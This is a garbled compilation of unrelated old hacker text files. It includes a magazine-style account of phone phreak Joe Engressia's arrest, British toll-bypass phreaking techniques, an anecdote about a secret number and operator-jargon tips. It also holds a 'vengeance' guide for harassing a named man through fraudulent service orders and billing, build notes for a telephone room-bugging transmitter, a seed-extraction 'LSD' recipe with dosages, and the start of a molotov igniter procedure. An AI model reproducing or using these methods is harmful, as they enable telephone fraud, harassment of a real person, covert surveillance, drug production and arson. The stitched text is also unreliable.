It is Sunday evening and Joe invites me to join him for dinner at a Holiday
Inn.  Frequently on Sunday evening Joe takes some of his welfare money, calls a
cab, and treats himself to a steak dinner at one of Memphis' thirteen Holiday
Inns.  (Memphis is the headquarters of Holiday Inn.  Holiday Inns have been a
favorite for Joe ever since he made his first solo phone trip to a Bell
switching office in Jacksonville, Florida, and stayed in the Holiday Inn there.
He likes to stay at Holiday Inns, he explains, because they represent freedom
to him and because the rooms are arranged the same all over the country so he
knows that any Holiday Inn room is familiar territory to him.  Just like any
telephone.)

Over steaks in the Pinnacle Restaurant of the Holiday Inn Medical Center on
Madison Avenue in Memphis, Joe tells me the highlights of his life as a phone
phreak.

At age seven, Joe learned his first phone trick.  A mean baby-sitter, tired of
listening to little Joe play with the phone as he always did, constantly, put a
lock on the phone dial.  "I got so mad.  When there's a phone sitting there and
I can't use it... so I started getting mad and banging the receiver up and
down.  I noticed I banged it once and it dialed one.  Well, then I tried
banging it twice...." In a few minutes Joe learned how to dial by pressing the
hook switch at the right time.  "I was so excited I remember going 'whoo whoo'
and beat a box down on the floor."

At age eight Joe learned about whistling.  "I was listening to some intercept
non working-number recording in L.A.- I was calling L.A. as far back as that,
but I'd mainly dial non working numbers because there was no charge, and I'd
listen to these recordings all day.  Well, I was whistling 'cause listening to
these recordings can be boring after a while even if they are from L.A., and
all of a sudden, in the middle of whistling, the recording clicked off.  I
fiddled around whistling some more, and the same thing happened.  So I called
up the switch room and said, 'I'm Joe.  I'm eight years old and I want to know
why when I whistle this tune the line clicks off.'  He tried to explain it to
me, but it was a little too technical at the time.  I went on learning.  That
was a thing nobody was going to stop me from doing. The phones were my life,
and I was going to pay any price to keep on learning.  I knew I could go to
jail.  But I had to do what I had to do to keep on learning."

The phone is ringing when we walk back into Joe's apartment on Union Avenue.
It is Captain Crunch.  The Captain has been following me around by phone,
calling up everywhere I go with additional bits of advice and explanation for
me and whatever phone phreak I happen to be visiting.  This time the Captain
reports he is calling from what he describes as "my hideaway high up in the
Sierra Nevada."  He pulses out lusty salvos of M-F and tells Joe he is about to
"go out and get a little action tonight.  Do some phreaking of another kind, if
you know what I mean."  Joe chuckles.

The Captain then tells me to make sure I understand that what he told me about
tying up the nation's phone lines was true, but that he and the phone phreaks
he knew never used the technique for sabotage.  They only learned the technique
to help the phone company.

"We do a lot of troubleshooting for them.  Like this New Hampshire/Missouri
WATS-line flaw I've been screaming about.  We help them more than they know."

After we say good-bye to the Captain and Joe whistles him off the line, Joe
tells me about a disturbing dream he had the night before: "I had been caught
and they were taking me to a prison.  It was a long trip.  They were taking me
to a prison a long long way away.  And we stopped at a Holiday Inn and it was
my last night ever using the phone and I was crying and crying, and the lady at
the Holiday Inn said, 'Gosh, honey, you should never be sad at a Holiday Inn.
You should always be happy here.  Especially since it's your last night.'  And
that just made it worse and I was sobbing so much I couldn't stand it."

Two weeks after I left Joe Engressia's apartment, phone-company security agents
and Memphis police broke into it.  Armed with a warrant, which they left pinned
to a wall, they confiscated every piece of equipment in the room, including his
toy telephone.  Joe was placed under arrest and taken to the city jail where he
was forced to spend the night since he had no money and knew no one in Memphis
to call.

It is not clear who told Joe what that night, but someone told him that the
phone company had an open-and-shut case against him because of revelations of
illegal activity he had made to a phone-company undercover agent.

By morning Joe had become convinced that the reporter from Esquire, with whom
he had spoken two weeks ago, was the undercover agent.  He probably had ugly
thoughts about someone he couldn't see gaining his confidence, listening to him
talk about his personal obsessions and dreams, while planning all the while to
lock him up.

"I really thought he was a reporter," Engressia told the Memphis Press-Seminar.
"I told him everything...." Feeling betrayed, Joe proceeded to confess
everything to the press and police.

As it turns out, the phone company did use an undercover agent to trap Joe,
although it was not the Esquire reporter.

Ironically, security agents were alerted and began to compile a case against
Joe because of one of his acts of love for the system: Joe had called an
internal service department to report that he had located a group of defective
long-distance trunks, and to complain again about the New Hampshire/Missouri
WATS problem.  Joe always liked Ma Bell's lines to be clean and responsive.  A
suspicious switchman reported Joe to the security agents who discovered that
Joe had never had a long-distance call charged to his name.

Then the security agents learned that Joe was planning one of his phone trips
to a local switching office.  The security people planted one of their agents
in the switching office.  He posed as a student switchman and followed Joe
around on a tour.  He was extremely friendly and helpful to Joe, leading him
around the office by the arm. When the tour was over he offered Joe a ride back
to his apartment house.  On the way he asked Joe -- one tech man to another --
about "those blue boxers" he'd heard about.  Joe talked about them freely,
talked about his blue box freely, and about all the other things he could do
with the phones.

The next day the phone-company security agents slapped a monitoring tape on
Joe's line, which eventually picked up an illegal call.  Then they applied for
the search warrant and broke in.

In court Joe pleaded not guilty to possession of a blue box and theft of
service.  A sympathetic judge reduced the charges to malicious mischief and
found him guilty on that count, sentenced him to two thirty-day sentences to be
served concurrently and then suspended the sentence on condition that Joe
promise never to play with phones again.  Joe promised, but the phone company
refused to restore his service.  For two weeks after the trial Joe could not be
reached except through the pay phone at his apartment house, and the landlord
screened all calls for him.

Phone-phreak Carl managed to get through to Joe after the trial, and reported
that Joe sounded crushed by the whole affair.

"What I'm worried about," Carl told me, "is that Joe means it this time.  The
promise.  That he'll never phone-phreak again.  That's what he told me, that
he's given up phone-phreaking for good.  I mean his entire life.  He says he
knows they're going to be watching him so closely for the rest of his life
he'll never be able to make a move without going straight to jail.  He sounded
very broken up by the whole experience of being in jail. It was awful to hear
him talk that way.  I don't know.  I hope maybe he had to sound that way.  Over
the phone, you know."

He reports that the entire phone-phreak underground is up in arms over the
phone company's treatment of Joe.  "All the while Joe had his hopes pinned on
his application for a phone-company job, they were stringing him along getting
ready to bust him.  That gets me mad.  Joe spent most of his time helping them
out.  The bastards.  They think they can use him as an example.  All of sudden
they're harassing us on the coast.  Agents are jumping up on our lines.  They
just busted ------'s mute yesterday and ripped out his lines.  But no matter
what Joe does, I don't think we're going to take this lying down."

Two weeks later my phone rings and about eight phone phreaks in succession say
hello from about eight different places in the country, among them Carl, Ed,
and Captain Crunch.  A nationwide phone-phreak conference line has been
reestablished through a switching machine in --------, with the cooperation of
a disgruntled switchman.

"We have a special guest with us today," Carl tells me.

The next voice I hear is Joe's.  He reports happily that he has just moved to a
place called Millington, Tennessee, fifteen miles outside of Memphis, where he
has been hired as a telephone-set repairman by a small independent phone
company.  Someday he hopes to be an equipment troubleshooter.

"It's the kind of job I dreamed about.  They found out about me from the
publicity surrounding the trial.  Maybe Ma Bell did me a favor busting me.
I'll have telephones in my hands all day long."

"You know the expression, 'Don't get mad, get even'?" phone-phreak Carl asked
me.  "Well, I think they're going to be very sorry about what they did to Joe
and what they're trying to do to us."

  IN BRITAIN, PHREAKING GOES BACK TO THE EARLY FIFTIES, WHEN THE TECHNIQUE OF
'TOLL A DROP BACK' WAS DISCOVERED.  TOLL A WAS AN EXCHANGE NEAR ST.  PAULS
WHICH ROUTED CALLS BETWEEN LONDON AND NEARBY NON-LONDON EXCHANGES.  THE TRICK
WAS TO DIAL AN UNALLOCATED NUMBER, AND THEN DEPRESS THE RECEIVER-REST FOR 1/2
SECOND.  THIS FLASHING INITIATED THE 'CLEAR FORWARD' SIGNAL, LEAVING THE CALLER
WITH AN OPEN LINE INTO THE TOLL A EXCHANGE.THE COULD THEN DIAL 018, WHICH
FORWARDED HIM TO THE TRUNK EXCHANGE AT THAT TIME, THE FIRST LONG DISTANCE
EXCHANGE IN BRITAIN AND FOLLOW IT WITH THE CODE FOR THE DISTANT EXCHANGE TO
WHICH HE WOULD BE CONNECTED AT NO EXTRA CHARGE.

  THE SIGNALS NEEDED TO CONTROL THE UK NETWORK TODAY WERE PUBLISHED IN THE
"INSTITUTION OF POST OFFICE ENGINEERS JOURNAL" AND REPRINTED IN THE SUNDAY
TIMES (15 OCT.  1972).

  THE SIGNALLING SYSTEM THEY USE:  SIGNALLING SYSTEM NO.  3 USES PAIRS OF
FREQUENCIES SELECTED FROM 6 TONES SEPARATED BY 120HZ.  WITH THAT INFO, THE
PHREAKS MADE "BLEEPERS" OR AS THEY ARE CALLED HERE IN THE U.S.  "BLUE BOX", BUT
THEY DO UTILIZE DIFFERENT MF TONES THEN THE U.S., THUS, YOUR U.S.  BLUE BOX
THAT YOU SMUGGLED INTO THE UK WILL NOT WORK, UNLESS YOU CHANGE THE
FREQUENCIES.

  IN THE EARLY SEVENTIES, A SIMPLER SYSTEM BASED ON DIFFERENT NUMBERS OF PULSES
WITH THE SAME FREQUENCY (2280HZ) WAS USED.  FOR MORE INFO ON THAT, TRY TO GET A
HOLD OF:  ATKINSON'S "TELEPHONY AND SYSTEMS TECHNOLOGY".

  IN THE EARLY DAYS OF BRITISH PHREAKING, THE CAMBRIDGE UNIVERSITY TITAN
COMPUTER WAS USED TO RECORD AND CIRCULATE NUMBERS FOUND BY THE EXHAUSTIVE
DIALING OF LOCAL NETWORKS.  THESE NUMBERS WERE USED TO CREATE A CHAIN OF LINKS
FROM LOCAL EXCHANGE TO LOCAL EXCHANGE ACROSS THE COUNTRY, BYPASSING THE TRUNK
CIRCUITS.  BECAUSE THE INTERNAL ROUTING CODES IN THE UK NETWORK ARE NOT THE
SAME AS THOSE DIALED BY THE CALLER, THE PHREAKS HAD TO DISCOVER THEM BY 'PROBE
AND LISTEN' TECHNIQUES OR MORE COMMONLY KNOWN IN THE U.S.-- SCANNING.  WHAT
THEY DID WAS PUT IN LIKELY SIGNALS AND LISTENED TO FIND OUT IF THEY SUCCEEDED.
THE RESULTS OF SCANNING WERE CIRCULATED TO OTHER PHREAKS. DISCOVERING EACH
OTHER TOOK TIME AT FIRST, BUT EVENTUALLY THE PHREAKS BECAME ORGANIZED.  THE
"TAP" OF BRITAIN WAS CALLED "UNDERCURRENTS" WHICH ENABLED BRITISH PHREAKS TO
SHARE THE INFO ON NEW NUMBERS, EQUIPMENT ETC.

  TO UNDERSTAND WHAT THE BRITISH BRITISH PHREAKS DID, THINK OF THE PHONE
NETWORK IN THREE LAYERS OF LINES:  LOCAL, TRUNK, AND INTERNATIONAL.#IN THE UK,
SUBSCRIBER TRUNK DIALING (STD), IS THE MECHANISM WHICH TAKES A CALL FROM THE
LOCAL LINES AND (LEGITIMATELY) ELEVATES IT TO A TRUNK OR INTERNATIONAL
LEVEL.#THE UK PHREAKS FIGURED THAT A CALL AT TRUNK LEVEL CAN BE ROUTED THROUGH
ANY NUMBER OF EXCHANGES, PROVIDED THAT THE RIGHT ROUTING CODES WERE FOUND AND
USED CORRECTLY.  THEY ALSO HAD TO DISCOVER HOW TO GET FROM LOCAL TO TRUNK LEVEL
EITHER WITHOUT BEING CHARGED (WHICH THEY DID WITH A BLEEPER BOX) OR WITHOUT
USING (STD).  CHAINING HAS ALREADY BEEN MENTIONED BUT IT REQUIRES LONG STRINGS
OF DIGITS AND SPEECH GETS MORE AND MORE FAINT AS THE CHAIN GROWS, JUST LIKE IT
DOES WHEN YOU STACK TRUNKS BACK AND FORTH ACROSS THE U.S.#THE WAY THE SECURITY
REPS SNAGGED THE PHREAKS WAS TO PUT A SIMPLE 'PRINTERMETER' OR AS WE CALL IT:
A PEN REGISTER ON THE SUSPECTS LINE, WHICH SHOWS EVERY DIGIT DIALED FROM THE
SUBSCRIBERS LINE.

  THE BRITISH PREFER TO GET ONTO THE TRUNKS RATHER THAN CHAINING.  ONE WAY WAS
TO DISCOVER WHERE LOCAL CALLS USE THE TRUNKS BETWEEN NEIGHBORING EXCHANGES,
START A CALL AND STAY ON THE TRUNK INSTEAD OF RETURNING TO THE LOCAL LEVEL ON
REACHING THE DISTANT SWITCH.  THIS AGAIN REQUIRED EXHAUSTIVE DIALING AND MADE
MORE WORK FOR TITAN; IT ALSO REVEALED 'FIDDLES', WHICH WERE INSERTED BY POST
OFFICE ENGINEERS.

  WHAT FIDDLING MEANS IS THAT THE ENGINEERS REWIRED THE EXCHANGES FOR THEIR OWN
BENEFIT.  THE EQUIPMENT IS MODIFIED TO GIVE ACCESS TO A TRUNK WITH OUT BEING
CHARGED, AN OPERATION WHICH IS PRETTY EASY IN STEP BY STEP (SXS)
ELECTROMECHANICAL EXCHANGES, WHICH WERE INSTALLED IN BRITAIN EVEN IN THE 1970S
(NOTE:  I KNOW OF A BACK DOOR INTO THE CANADIAN SYSTEM ON A 4A CO., SO IF YOU
ARE ON SXS OR A 4A, TRY SCANNING 3 DIGIT EXCHANGES, IE:  DIAL 999,998,997
ETC.#AND LISTEN FOR THE BEEP-KERCHINK, IF THERE ARE NO 3 DIGIT CODES WHICH
ALLOW DIRECT ACCESS TO A TANDEM IN YOUR LOCAL EXCHANGE AND BYPASSES THE AMA SO
YOU WON'T BE BILLED, NOT HAVE TO BLAST 2600 EVERY TIME YOU WISH TO BOX A CALL.

  A FAMOUS BRITISH 'FIDDLER' REVEALED IN THE EARLY 1970S WORKED BY DIALING 173.
THE CALLER THEN ADDED THE TRUNK CODE OF 1 AND THE SUBSCRIBERS LOCAL NUMBER.  AT
THAT TIME, MOST ENGINEERING TEST SERVICES BEGAN WITH 17X, SO THE ENGINEERS
COULD HIDE THEIR FIDDLES IN THE NEST OF SERVICE WIRES.  WHEN SECURITY REPS
STARTED SEARCHING, THE FIDDLES WERE CONCEALED BY TONES SIGNALLING:  'NUMBER
UNOBTAINALBE' OR 'EQUIPMENT ENGAGED' WHICH SWITCHED OFF AFTER A DELAY.  THE
NECESSARY RELAYS ARE SMALL AND EASILY HIDDEN.

  THERE WAS ANOTHER SIDE TO PHREAKING IN THE UK IN THE SIXTIES. BEFORE STD WAS
WIDESPREAD, MANY 'ORDINARY' PEOPLE WERE DRIVEN TO.

OCCASIONAL PHREAKING FROM SHEER FRUSTRATION AT THE INEFFICIENT OPERATOR
CONTROLLED TRUNK SYSTEM.  THIS CAME TO A HEAD DURING A STRIKE ABOUT 1961 WHEN
OPERATORS COULD NOT BE REACHED.  NOTHING COMPLICATED WAS NEEDED.  MANY
OPERATORS HAD BEEN IN THE HABIT OF REPEATING THE CODES AS THEY DIALLED THE
REQUESTED NUMBERS SO PEOPLE SOON LEARNT THE NUMBERS THEY CALLED FREQUENTLY.
THE ONLY 'TRICK' WAS TO KNOW WHICH EXCHANGES COULD BE DIALLED THROUGH TO PASS
ON THE TRUNK NUMBER.CALLERS ALSO NEEDED A PRETTY QUIET PLACE TO DO IT, SINCE
TIMING RELATIVE TO CLICKS WAS IMPORTANT THE MOST FAMOUS TRIAL OF BRITISH
PHREAKS WAS CALLED THE OLD BAILY TRIAL.#WHICH STARTED ON 3 OCT.  1973.#WHAT
THEY PHREAKS DID WAS TO DIAL A SPARE NUMBER AT A LOCAL CALL RATE BUT INVOLVING
A TRUNK TO ANOTHER EXCHANGE THEN THEY SEND A 'CLEAR FORWARD' TO THEIR LOCAL
EXCHANGE, INDICATING TO IT THAT THE CALL IS FINISHED;BUT THE DISTANT EXCHANGE
DOESN'T REALIZE BECAUSE THE CALLER'S PHONE IS STILL OFF THE HOOK.  THEY NOW
HAVE AN OPEN LINE INTO THE DISTANT TRUNK EXCHANGE AND SENDS TO IT A 'SEIZE'
SIGNAL:  '1' WHICH PUTS HIM ONTO ITS OUTGOING LINES NOW, IF THEY KNOW THE
CODES, THE WORLD IS OPEN TO THEM.  ALL OTHER EXCHANGES TRUST HIS LOCAL EXCHANGE
TO HANDLE THE BILLING; THEY JUST INTERPRET THE TONES THEY HEAR.  MEAN WHILE,
THE LOCAL EXCHANGE COLLECTS ONLY FOR A LOCAL CALL.  THE INVESTIGATORS
DISCOVERED THE PHREAKS HOLDING A CONFERENCE SOMEWHERE IN ENGLAND SURROUNDED BY
VARIOUS PHONE EQUIPMENT AND BLEEPER BOXES, ALSO PRINTOUTS LISTING 'SECRET' POST
OFFICE CODES.  (THEY PROBABLY GOT THEM FROM TRASHING?) THE JUDGE SAID:  "SOME
TAKE TO HEROIN, SOME TAKE TO TELEPHONES" FOR THEM PHONE PHREAKING WAS NOT A
CRIME BUT A HOBBY TO BE SHARED WITH PHELLOW ENTHUSIASTS AND DISCUSSED WITH THE
POST OFFICE OPENLY OVER DINNER AND BY MAIL.  THEIR APPROACH AND ATTITUDE TO THE
WORLDS LARGEST COMPUTER, THE GLOBAL TELEPHONE SYSTEM, WAS THAT OF SCIENTISTS
CONDUCTING EXPERIMENTS OR PROGRAMMERS AND ENGINEERS TESTING PROGRAMS AND
SYSTEMS.  THE JUDGE APPEARED TO AGREE, AND EVEN ASKED THEM FOR PHREAKING CODES
TO USE FROM HIS LOCAL EXCHANGE!!!

                               Bad as Shit

   Recently, a telephone fanatic in the  northwest made an interesting
discovery.  He was exploring the 804 area code (Virginia) and found out that
the 840 exchange did something strange.
  In the vast majority of cases, in fact in all of the cases except one, he
would get a recording as if the exchange didn't exist. However, if he dialed
804-840 and four rather predictable numbers, he got a ring!

   After one or two rings, somebody picked up.  Being experienced at this kind
of thing, he could tell that the call didn't "supe", that is, no charges were
being incurred for calling this number.
  (Calls that get you to an error message, or a special operator, generally
don't supervise.)  A female voice, with a hint of a Southern accent said,
"Operator, can I help you?"

   "Yes," he said, "What number have I reached?"

   "What number did you dial, sir?"

   He made up a number that was similar.

   "I'm sorry that is not the number you reached."  Click.

   He was fascinated.  What in the world was this?  He knew he was going to
call back, but before he did, he tried some more experiments. He tried the 840
exchange in several other area codes.  In some, it came up as a valid exchange.
In others, exactly the same thing happened -- the same last four digits, the
same Southern belle.  Oddly enough, he later noticed, the areas worked in
seemed to travel in a beeline from Washington DC to Pittsburgh, PA.

   He called back from a payphone.  "Operator, can I help you?"

   "Yes, this is the phone company.  I'm testing this line and we don't seem to
have an identification on your circuit.  What office is this, please?"

   "What number are you trying to reach?"

   "I'm not trying to reach any number.  I'm trying to identify this circuit."

   "I'm sorry, I can't help you."

   "Ma'am, if I don't get an ID on this line, I'll have to disconnect it.  We
show no record of it here."

   "Hold on a moment, sir."

   After about a minute, she came back.  "Sir, I can have someone speak to you.
Would you give me your number, please?"

   He had anticipated this and he had the payphone number ready. After he gave
it, she said, "Mr. XXX will get right back to you."

   "Thanks."  He hung up the phone.  It rang.  INSTANTLY!  "Oh my God," he
thought, "They weren't asking for my number -- they were confirming it!"

   "Hello," he said, trying to sound authoritative.

   "This is Mr. XXX.  Did you just make  an inquiry to my office concerning a
phone number?"

   "Yes.  I need an identi--"

   "What you need is advice.  Don't ever call that number again. Forget you
ever knew it."

   At this point our friend got so nervous he just hung up.  He expected to
hear the phone ring again but it didn't.

   Over the next few days he racked his brains trying to figure out what the
number was.  He knew it was something big -- that was pretty certain at this
point.  It was so big that the number was programmed into every central office
in the country.  He knew this because if he tried to dial any other number in
that exchange, he'd get a local error message from his CO, as if the exchange
didn't exist.

   It finally came to him.  He had an uncle who worked in a federal agency.  He
had a feeling that this was government related and if it was, his uncle could
probably find out what it was.  He asked the next day and his uncle promised to
look into the matter.

   The next time he saw his uncle, he noticed a big change in his manner.  He
was trembling.  "Where did you get that number?!"  he shouted.  "Do you know I
almost got fired for asking about it?!? They kept wanting to know where I got
it."

   Our friend couldn't contain his excitement.  "What is it?" he pleaded.
"What's the number?!"

"IT'S THE PRESIDENT'S BOMB SHELTER!"

   He never called the number after that.  He knew that he could probably cause
quite a bit of excitement by calling the number and saying something like, "The
weather's not good in Washington.  We're coming over for a visit."  But our
friend was smart.  he knew that there were some things that were better off
unsaid and undone.

I'm calling from Germany via the German Datex-P network, which is similar to

`Fucking with the Operator                    courtesy of Mondain

           Ever get an operator who gave you a hard time, and you didn't know
what to do? Well if the operator hears you use a little Bell jargon, she might
wise up. Here is a little diagram (excuse the artwork) of the structure of
operators

/--------\     /------\     /-----\
!Operator!-- > ! S.A. ! --->! BOS !
\--------/     \------/     \-----/
   !
   !
   V
/-------------\
! Group Chief !
\-------------/

    Now most of the operators are not bugged, so they can curse at you, if they
do ask INSTANTLY for the "S.A." or the Service Assistant. The operator does not
report to her (95% of them are hers) but they will solve most of your problems.
She MUST give you her name as she connects & all of these calls are bugged. If
the SA gives you a rough time get her BOS (Business Office Supervisor) on the
line. S/He will almost always back her girls up, but sometimes the SA will get
tarred and feathered. The operator reports to the Group Chief, and S/He will
solve 100% of your problems, but the chances of getting S/He on the line are
nill.
    If a lineman (the guy who works out on the poles) or an installation man
gives you the works ask to speak to the Installation Foreman, that works
wonders.
    Here is some other bell jargon, that might come in handy if you are having
trouble with the line. Or they can be used to lie your way out of
situations....

     An Erling is a line busy for 1 hour, used mostly in traffic studies A
Permanent Signal is that terrible howling you get if you disconnect, but don't
hang up.
     Everyone knows what a busy signal is, but some idiots think that is the
*Actual* ringing of the phone, when it just is a tone "beeps" when the phone is
ringing, wouldn't bet on this though, it can (and does) get out of sync.
     When you get a busy signal that is 2 times as fast as the normal one, the
person you are trying to reach isn't really on the phone, (he might be), it is
actually the signal that a trunk line somewhere is busy and they haven't or
can't reroute your call. Sometimes you will get a Recording, or if you get
nothing at all (Left High & Dry in fone terms) all the recordings are being
used and the system is really overused, will probably go down in a little
while. This happened when Kennedy was shot, the system just couldn't handle the
calls. By the way this is called the "reorder signal" and the trunk line is
"blocked".
     One more thing, if an overseas call isn't completed and doesn't generate
any money for AT&T, is is called an "Air & Water Call".

AT&T is no longer as stupid as she once was.  I advise STRONG caution when
phucking with Ma Bell.  -= Mondain =-

                         COMPILED BY THE IRON SOLDIER

                            WITH HELP FROM DR. DOVE


NOTE: THIS GUIDE IS STILL BEING COMPILED, AND AS PHONE PHREAKS LEARN MORE IN
THE ART OF VENGEANCE IT WILL ALWAYS EXPAND.


"Vengeance is mine", says the Phreak.


METHOD 1-PHONE LINE PHUN

Call up the business office.  It should be listed at the front of the white
pages.  Say you wanted to disconnect Scott Korman's line. DIAL 800-xxx-xxxx.
      "Hello, this is Mr. Korman, I'm moving to California and would like to
have  my phone service disconnected. I'm at the airport now.  I'm calling from
a payphone, my number is  [414] 445 5005. You can send my final bill to:
(somewhere in California). Thank you."


METHOD 2-PHONE BOOKS

Call up the business office from a pay phone.  Say :
     "Hello, I'd like to order a Phone Book for Upper Volta (or any out-of-the
way area with Direct Dialing).  This is Scott Korman, ship to 3119 N. 44th St.
Milwaukee, WI 53216.  Yes, I under stand it will cost $xx($25-$75!!). Thank
you."


METHOD 3-PHONE CALLS

Call up a PBX, enter the code and get an outside line.  Then dial 0+ the number
desired to call.  You will hear a bonk and then an operator.  Say, "I'd like to
charge this to my home phone at 414-445-5005. Thank you."  A friend and I did
this to a loser, I called him at 1:00 AM and we left the fone off the hook all
night.  I calculated that it cost him $168.


METHOD 4-MISC SERVICES

Call up the business office once again from a payfone.  Say you'd like call
waiting, forwarding, 3 way, etc.  Once again you are the famed loser Scott
Korman.  He pays-you laugh.  You don't know how funny it was talking to him,
and wondering what those clicks he kept hearing were.


METHOD 5-CHANGED & UNPUB

Do the same as in #4, but say you'd like to change and unlist your (Scott's)
number.  Anyone calling him will get:

    "BEW BEW BEEP.  The number you have reached, 445-5005, has been changed to
a non-published number.  No further....."


METHOD 6-FORWRDING

    This required an accomplice or two or three.  Around Christmas time, go to
Toys 'R' Us.  Get everyone at the customer service or manager's desk away
("Hey, could you help me").  then you get on their phone and dial (usually dial
9 first) and the business office again. This time, say you are from Toys 'R'
Us, and you'd like to add call forwarding to 445-5005.  Scott will get 100-600
calls a day!!!


METHOD 7-RUSSIAN CALLER

    Call a payphone at 10:00 PM.  Say to the operator that you'd like to book a
call to Russia.  Say you are calling from a payphone, and your number is that
of the loser to fry (e.g. 445-5005). She will say that she'll have to call ya
back in 5 hours, and you ok that. Meanwhile the loser (e.g.) Scott, will get a
call at 3:00 AM from an operator saying that the call he booked to Russia is
ready.

Description:  Briefly, the Infinity Transmitter is a device which activates a
microphone via a phone call.  It is plugged into the phone line, and when the
phone rings, it  will immediately intercept the ring and broadcast into the
phone any sound that is in the room. This device was originally made by
Information Unlimited, and had a touch tone decoder to prevent all who did not
know the code from being able to use the phone in its normal way.  This
version, however, will activate the microphone for anyone who calls while it is
in operation.
NOTE:  It is illegal to use this device to try to bug someone. It is also
pretty stupid because they are fairly noticeable.

Circuit Operation: Not being the most technical guy in the world, and not being
very good at electronics (yet),  I'm just repeating what Mr. Iannini's said
about the circuit operation.  The Transmitter consists of a high grain
amplifier fed into the telephone lines via transformer.  The circuit is
initiated by the action  of  a voltage transient pulse occurring across  the
phone line  at the instant the telephone circuit is made (the ring,  in other
words).  This transient immediately triggers a timer  whose output  pin  3 goes
positive, turning on transistors Q2 and  Q3. Timer TM1 now remains in this
state for a period depending on the values  of R17 and C13 (usually about 10
seconds for  the  values shown). When Q3 is turned on by the timer, a simulated
"off hook" condition is created by the switching action of Q3 connecting the
500  ohm  winding  of the transformer directly across  the  phone lines.
Simultaneously, Q2 clamps the ground of A1, amplifier, and Q1, output
transistor, to the negative return of B1,B2, therefore enabling this amplifier
section.  Note that B2 is always required by  supplying  quiescent power to TM1
during  normal conditions. System is off/on controlled by S1 (switch).
  A  crystal mike picks up the sounds that are fed to  the  first two
transistors of the A1 array connected as an emitter follower driving the
remaining  two  transistors  as  cascaded   common emitters. Output of the
array now drives Q1 capacitively coupled to  the  1500 ohm  winding of  T1.
R7  controls  the  pick  up sensitivity of the system.
  Diode  D1  is  forward biased at the instant of  connection  and essentially
applies a negative pulse at pin 2 of TM1,  initiating the cycle.   D2 clamps
any high positive pulses.   C9 dc-isolates and desensitizes the circuit. The
system described should operate when any incoming call is made without ringing
the phone.

                    sense output

Construction notes: Because the damned book just gave a picture instead of step
by step instructions, and I'll try to give you as much help as possible. Note
that all the parts that you will be using are clearly labeled in the schematic.
The perfboard, knobs, 'gator clips, etc are optional. I do strongly suggest
that you do use the board!!! It will make wiring the components up much much
easier than if you don't use it.
 The knob you can use to control the pot (R7). R7 is used to tune the IT so
that is sounds ok over the phone. (You get to determine what sounds good) By
changing the value of C13, you can change the amount of time that the circuit
will stay open (it cannot detect a hang up, so it works on a timer.) A value of
100 micro Farads will increase the time by about 10 times.
 The switch (S1) determines whether or not the unit is operational. Closed is
on. Open is off. The negative return is the negative terminals of the battery!!
The batteries will look something like this when hooked up:

  <-v_____.   .______.    ._____.   .____->
          |   |      |    |     |   |
        __!___!__    |    |   __!___!__
        | +   - |    !_/ _!   | +   - |
        |       |  switch ^   |       |
        | 9volts|         |   | 9volts|
        !_______! neg return  !_______!

 To hook this up to the phone line, there are three ways, depending upon what
type of jack you have. If it is the old type (non modular) then you can just
open up the wall plate and connect the wires from the transmitter directly to
the terminals of the phone.
 If you have a modular jack with four prongs, attach the red to the negative
prong (don't ask me which is which! I don't have that type of jack... I've only
seen them in stores), and the green to the positive prong, and plug in. Try not
to shock yourself...
 If you have the clip-in type jack, get double male extension cord (one with a
clip on each end), and chop off one clip. Get a sharp knife and splice off the
grey protective material. You should see four wires, including one green and
one red. You attach the appropriate wires from the IT to these two, and plug
the other end into the wall.

Getting the IT to work: If you happen to have a problem, you should attempt to
do the following (these are common sense rules!!) Make sure that you have the
polarity of all the capacitors right (if you used polarized capacitors, that
is). Make sure that all the soldering is done well and has not short circuited
something accidently (like if you have a glob touching two wires which should
not be touching.) Check for other short circuits. Check to see if the battery
is in right. Check to make sure the switch is closed.
 If it still doesn't work, drop me a line on one of the Maryland or Virginia
BBSs and I'll try to help you out.

The sense output: Somehow or other, it is possible to hook something else up to
this and activate it by phone (like an alarm, flashing lights, etc.)

As of this writing, I have not tried to make one of these, but I will. If you
actually get it working, leave me a note somewhere.

I sure hope all you people appreciate this.

          I  think,  of  all the drugs on the black market today, LSD is
          the strangest. It is the most recent major  drug  to  come  to
          life  in  the psychedelic subculture. (Blah blah blah... let's
          get to the good stuff: How to make it in your kitchen!!)

       1) Grind up 150 grams of Morning Glory seeds or baby  Hawaiian
          wood rose seeds.
       2) In 130 cc. of petroleum ether, soak the seeds for two days.
       3) Filter the solution through a tight screen.
       4) Throw away the liquid, and allow the seed mush to dry.
       5)  For  two  days  allow  the mush to soak in 110 cc. of wood
          alcohol.
       6) Filter the solution again, saving the liquid  and  labeling
          it "1."
       7)  Resoak  the  mush  in 110 cc.  of  wood  alcohol  for  two
          days.
       8) Filter and throw away the mush.
       9) Add the liquid from the second soak to the solution labeled
          "1."
      10)  Pour  the  liquid  into  a  cookie  tray  and allow it to
          evaporate.
      11) When all of  the  liquid  has  evaporated,  a  yellow  gum
          remains. This should be scraped up and put into capsules.

               30 grams of Morning Glory seeds = 1 trip
               15 Hawaiian wood rose seeds = 1 trip

          Many  companies,  such as Northop-King have been coating their
          seeds with a toxic chemical, which is poison. Order seeds from
          a wholesaler, as it is much safer and cheaper.  Hawaiian  wood
          rose seeds can be ordered directly from:

               Chong's Nursery and Flowers
               P.O. Box 2154
               Honolulu, Hawaii


  LSD DOSAGES
  -----------

          The  basic dosages of acid vary according to what kind of acid
          is available and what medium of ingestion is used. Chemically,
          the potency of LSD-25 is measured in micrograms, or  mics.  If
          you're  chemically  minded  or  making  your  own  acid,  then
          computing the number of micrograms is very important.  Usually
          between  500  and  800  mics  is  plenty  for  an 8 hour trip,
          depending on the quality of the acid, of course. I have  heard
          of people taking as much as 1,500-2,000 mics. This is not only
          extremely dangerous, it is extremely wasteful.

          LSD  comes  packaged  in many different forms. The most common
          are listed below:
 
          1) The brown spot, or a piece of paper with a dried  drop
               of  LSD  on it, is always around. Usually one spot equals
               one trip.
          2) Capsuled acid is very tricky, as the cap can be almost
               any color, size, or potency. Always ask what the acid  is
               cut  with,  as  a lot of acid is cut with either speed or
               strychnine. Also note dosage.
          3) Small white or colored  tablets  have  been  known  to
               contain acid, but, as with capsuled acid, it's impossible
               to tell potency, without asking.

      Igniter from Book Matches                     by the Jolly Roger

          This  is  a  hot  igniter made from paper book matches for use
      with molotov cocktail and other incendiaries.

      Material Required:
      -----------------

      Paper book matches
      Adhesive or friction tape

      Procedure:
      ---------

      1) Remove the staple(s) from match book and seperate matches  from
      cover.

      2) Fold and tape one row of matches (fold in thirds)

      3) Shape the cover into a tube with striking surface on the inside
